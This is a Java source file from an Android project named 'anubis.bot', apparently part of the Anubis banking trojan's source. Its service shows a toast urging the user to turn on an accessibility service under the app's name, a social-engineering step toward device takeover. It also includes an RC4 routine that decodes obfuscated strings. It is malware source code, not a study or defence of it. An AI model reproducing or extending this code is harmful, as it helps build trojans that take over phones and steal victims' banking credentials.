package anubis.bot.myapplication;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Base64;
import android.view.Gravity;
import android.widget.Toast;

import anubis.bot.myapplication.API.ClassRC4;

public class ServiceToast extends Service {
    UtilsClass SF = new UtilsClass();
    Constants const_ = new Constants();
    public ServiceToast() {
    }
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        String getText =  SF.getNameApp(this);
        if(!const_.nameAccessibilityService.equals("")) getText = const_.nameAccessibilityService;
        Toast toast = Toast.makeText(this, SF.SetRead(this, "StringAccessibility") + " '" + getText + "'", Toast.LENGTH_LONG);
        toast.setGravity(Gravity.CENTER_VERTICAL, 0, 0);
        toast.show();
        return flags;
    }
    @Override
    public IBinder onBind(Intent intent) {
        throw new UnsupportedOperationException("Not yet implemented");
    }

    public String str_decrypt(String textDE_C, String key)
    {
        UtilsClass utilsClass = new UtilsClass();
        try
        {
            byte[] data = Base64.decode(textDE_C, Base64.DEFAULT);
            textDE_C = new String(data, "UTF-8");
            byte[] detext = utilsClass.hexStringToByteArray(textDE_C);
            ClassRC4 rcd = new ClassRC4(key.getBytes());
            return  new String(rcd.decrypt(detext));
        }catch (Exception ex){ }
        return "";
    }
}
